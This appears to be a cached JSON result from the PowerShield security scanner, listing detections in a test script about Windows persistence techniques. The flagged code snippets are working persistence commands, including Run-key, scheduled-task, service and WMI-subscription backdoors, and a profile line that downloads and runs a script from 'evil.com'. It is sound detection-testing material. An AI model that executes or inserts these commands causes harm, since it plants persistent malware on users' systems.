# tests/TestScripts/.powershield-cache/L2hvbWUvcnVubmVyL3dvcmsvUG93ZXJTaGllbGQvUG93ZXJTaGllbGQvdGVzdHMvVGVzdFNjcmlwdHMvcG93ZXJzaGVsbC9wZXJzaXN0ZW5jZS1tZWNoYW5pc21zLnBzMXxEOEYyNTJGQzJBODM1MzRBRjYzQUZEOTdFOEQ1QUU0NDg5QjEwQUI4OTlDREI1MTQ1MDRGNEYzNDg2MzI5MTE1.json
{
  "Timestamp": "2025-10-25T17:22:33.3824387Z",
  "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/persistence-mechanisms.ps1",
  "FileHash": "D8F252FC2A83534AF63AFD97E8D5AE4489B10AB899CDB514504F4F3486329115",
  "Result": {
    "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/persistence-mechanisms.ps1",
    "Violations": [
      {
        "Name": "PrivilegedRegistryAccess",
        "Message": "HKEY_LOCAL_MACHINE registry access detected. Consider if privileges are necessary.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 6,
        "Code": "New-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"Backdoor\" -Value \"C:\\malware\\evil.exe\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/persistence-mechanisms.ps1",
        "RuleId": "PrivilegedRegistryAccess",
        "Metadata": {}
      },
      {
        "Name": "PrivilegedRegistryAccess",
        "Message": "HKEY_LOCAL_MACHINE registry access detected. Consider if privileges are necessary.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 12,
        "Code": "New-Item -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" -Force",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/persistence-mechanisms.ps1",
        "RuleId": "PrivilegedRegistryAccess",
        "Metadata": {}
      },
      {
        "Name": "PrivilegedRegistryAccess",
        "Message": "HKEY_LOCAL_MACHINE registry access detected. Consider if privileges are necessary.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 13,
        "Code": "Set-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" -Name \"Update\" -Value \"C:\\Temp\\payload.exe\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/persistence-mechanisms.ps1",
        "RuleId": "PrivilegedRegistryAccess",
        "Metadata": {}
      },
      {
        "Name": "DeprecatedCmdletUsage",
        "Message": "Using deprecated WMI cmdlet 'Get-WmiObject'. Use CIM cmdlet 'Get-CimObject' instead.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 72,
        "Code": "Get-WmiObject -Namespace root\\subscription -Query $query",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/persistence-mechanisms.ps1",
        "RuleId": "DeprecatedCmdletUsage",
        "Metadata": {}
      },
      {
        "Name": "DeprecatedCmdletUsage",
        "Message": "Using deprecated WMI cmdlet 'Set-WmiInstance'. Use CIM cmdlet 'Set-CimInstance' instead.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 79,
        "Code": "Set-WmiInstance -Namespace root\\subscription -Class ActiveScriptEventConsumer -Arguments @{Name=\"EvilScript\"; ScriptText=\"CreateObject('WScript.Shell').Run('calc.exe')\"}",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/persistence-mechanisms.ps1",
        "RuleId": "DeprecatedCmdletUsage",
        "Metadata": {}
      },
      {
        "Name": "DeprecatedCmdletUsage",
        "Message": "Using deprecated WMI cmdlet 'Register-WmiEvent'. Use CIM cmdlet 'Register-CimEvent' instead.",
        "Description": null,
        "Severity": 2,
        "LineNumber": 39,
        "Code": "Register-WmiEvent -Query \"SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process'\" -Action { Start-Process \"C:\\evil.exe\" }",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/persistence-mechanisms.ps1",
        "RuleId": "DeprecatedCmdletUsage",
        "Metadata": {}
      },
      {
        "Name": "PersistenceMechanismDetection",
        "Message": "Scheduled task creation detected. Verify this is legitimate - scheduled tasks are used for persistence. MITRE ATT&CK: T1053.005 (Scheduled Task).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 19,
        "Code": "New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"-File C:\\Scripts\\malicious.ps1\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/persistence-mechanisms.ps1",
        "RuleId": "PersistenceMechanismDetection",
        "Metadata": {}
      },
      {
        "Name": "PersistenceMechanismDetection",
        "Message": "Scheduled task creation detected. Verify this is legitimate - scheduled tasks are used for persistence. MITRE ATT&CK: T1053.005 (Scheduled Task).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 21,
        "Code": "Register-ScheduledTask -TaskName \"SystemUpdate\" -Action $action -Trigger $trigger",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/persistence-mechanisms.ps1",
        "RuleId": "PersistenceMechanismDetection",
        "Metadata": {}
      },
      {
        "Name": "PersistenceMechanismDetection",
        "Message": "Scheduled task creation detected. Verify this is legitimate - scheduled tasks are used for persistence. MITRE ATT&CK: T1053.005 (Scheduled Task).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 24,
        "Code": "New-ScheduledTask -Action $action -Trigger $trigger -TaskName \"Backdoor\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/persistence-mechanisms.ps1",
        "RuleId": "PersistenceMechanismDetection",
        "Metadata": {}
      },
      {
        "Name": "PersistenceMechanismDetection",
        "Message": "Scheduled task creation detected. Verify this is legitimate - scheduled tasks are used for persistence. MITRE ATT&CK: T1053.005 (Scheduled Task).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 27,
        "Code": "schtasks /create /tn \"EvilTask\" /tr \"C:\\malware\\payload.exe\" /sc onlogon",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/persistence-mechanisms.ps1",
        "RuleId": "PersistenceMechanismDetection",
        "Metadata": {}
      },
      {
        "Name": "PersistenceMechanismDetection",
        "Message": "WMI event subscription detected. This is an advanced persistence technique often used by malware. MITRE ATT&CK: T1546.003 (Windows Management Instrumentation Event Subscription).",
        "Description": null,
        "Severity": 4,
        "LineNumber": 79,
        "Code": "Set-WmiInstance -Namespace root\\subscription -Class ActiveScriptEventConsumer -Arguments @{Name=\"EvilScript\"; ScriptText=\"CreateObject('WScript.Shell').Run('calc.exe')\"}",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/persistence-mechanisms.ps1",
        "RuleId": "PersistenceMechanismDetection",
        "Metadata": {}
      },
      {
        "Name": "PersistenceMechanismDetection",
        "Message": "WMI persistence class reference detected: \\\\.\\root\\subscription:__EventFilter. This is highly suspicious. MITRE ATT&CK: T1546.003.",
        "Description": null,
        "Severity": 4,
        "LineNumber": 31,
        "Code": "\"\\\\.\\root\\subscription:__EventFilter\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/persistence-mechanisms.ps1",
        "RuleId": "PersistenceMechanismDetection",
        "Metadata": {}
      },
      {
        "Name": "PersistenceMechanismDetection",
        "Message": "WMI persistence class reference detected: SELECT * FROM __EventFilter WHERE Name='EvilFilter'. This is highly suspicious. MITRE ATT&CK: T1546.003.",
        "Description": null,
        "Severity": 4,
        "LineNumber": 71,
        "Code": "\"SELECT * FROM __EventFilter WHERE Name='EvilFilter'\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/persistence-mechanisms.ps1",
        "RuleId": "PersistenceMechanismDetection",
        "Metadata": {}
      },
      {
        "Name": "PersistenceMechanismDetection",
        "Message": "WMI persistence class reference detected: \\\\.\\root\\subscription:__FilterToConsumerBinding. This is highly suspicious. MITRE ATT&CK: T1546.003.",
        "Description": null,
        "Severity": 4,
        "LineNumber": 75,
        "Code": "\"\\\\.\\root\\subscription:__FilterToConsumerBinding\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/persistence-mechanisms.ps1",
        "RuleId": "PersistenceMechanismDetection",
        "Metadata": {}
      },
      {
        "Name": "PersistenceMechanismDetection",
        "Message": "PowerShell profile modification detected. Malware uses this to execute on every PowerShell session. MITRE ATT&CK: T1546.013 (PowerShell Profile).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 49,
        "Code": "Add-Content -Path $PROFILE -Value \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/load.ps1')\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/persistence-mechanisms.ps1",
        "RuleId": "PersistenceMechanismDetection",
        "Metadata": {}
      },
      {
        "Name": "PersistenceMechanismDetection",
        "Message": "PowerShell profile modification detected. Malware uses this to execute on every PowerShell session. MITRE ATT&CK: T1546.013 (PowerShell Profile).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 49,
        "Code": "Add-Content -Path $PROFILE -Value \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/load.ps1')\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/persistence-mechanisms.ps1",
        "RuleId": "PersistenceMechanismDetection",
        "Metadata": {}
      },
      {
        "Name": "PersistenceMechanismDetection",
        "Message": "PowerShell profile modification detected. Malware uses this to execute on every PowerShell session. MITRE ATT&CK: T1546.013 (PowerShell Profile).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 52,
        "Code": "Set-Content -Path $profile -Value \"Start-Process C:\\malware\\backdoor.exe -WindowStyle Hidden\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/persistence-mechanisms.ps1",
        "RuleId": "PersistenceMechanismDetection",
        "Metadata": {}
      },
      {
        "Name": "PersistenceMechanismDetection",
        "Message": "PowerShell profile modification detected. Malware uses this to execute on every PowerShell session. MITRE ATT&CK: T1546.013 (PowerShell Profile).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 52,
        "Code": "Set-Content -Path $profile -Value \"Start-Process C:\\malware\\backdoor.exe -WindowStyle Hidden\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/persistence-mechanisms.ps1",
        "RuleId": "PersistenceMechanismDetection",
        "Metadata": {}
      },
      {
        "Name": "PersistenceMechanismDetection",
        "Message": "Startup folder modification detected. Files in Startup folder execute on logon. MITRE ATT&CK: T1547.001 (Registry Run Keys / Startup Folder).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 55,
        "Code": "Copy-Item \"C:\\malware\\evil.exe\" \"C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.exe\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/persistence-mechanisms.ps1",
        "RuleId": "PersistenceMechanismDetection",
        "Metadata": {}
      },
      {
        "Name": "PersistenceMechanismDetection",
        "Message": "Startup folder modification detected. Files in Startup folder execute on logon. MITRE ATT&CK: T1547.001 (Registry Run Keys / Startup Folder).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 55,
        "Code": "\"C:\\Users\\Public\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.exe\"",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/persistence-mechanisms.ps1",
        "RuleId": "PersistenceMechanismDetection",
        "Metadata": {}
      },
      {
        "Name": "PersistenceMechanismDetection",
        "Message": "Windows service creation/modification detected. Services are used for system-level persistence. MITRE ATT&CK: T1543.003 (Windows Service).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 62,
        "Code": "New-Service -Name \"EvilService\" -BinaryPathName \"C:\\malware\\service.exe\" -StartupType Automatic",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/persistence-mechanisms.ps1",
        "RuleId": "PersistenceMechanismDetection",
        "Metadata": {}
      },
      {
        "Name": "PersistenceMechanismDetection",
        "Message": "Windows service creation/modification detected. Services are used for system-level persistence. MITRE ATT&CK: T1543.003 (Windows Service).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 65,
        "Code": "Set-Service -Name \"UpdaterService\" -StartupType Automatic -Status Running",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/persistence-mechanisms.ps1",
        "RuleId": "PersistenceMechanismDetection",
        "Metadata": {}
      },
      {
        "Name": "PersistenceMechanismDetection",
        "Message": "Windows service creation/modification detected. Services are used for system-level persistence. MITRE ATT&CK: T1543.003 (Windows Service).",
        "Description": null,
        "Severity": 3,
        "LineNumber": 68,
        "Code": "sc.exe create \"BackdoorSvc\" binpath= \"C:\\evil\\payload.exe\" start= auto",
        "FilePath": "/home/runner/work/PowerShield/PowerShield/tests/TestScripts/powershell/persistence-mechanisms.ps1",
        "RuleId": "PersistenceMechanismDetection",
        "Metadata": {}
      }
    ],
    "ParseErrors": [],
    "RulesExecuted": 52,
    "Timestamp": "2025-10-25T17:22:33.3821116+00:00"
  }
}
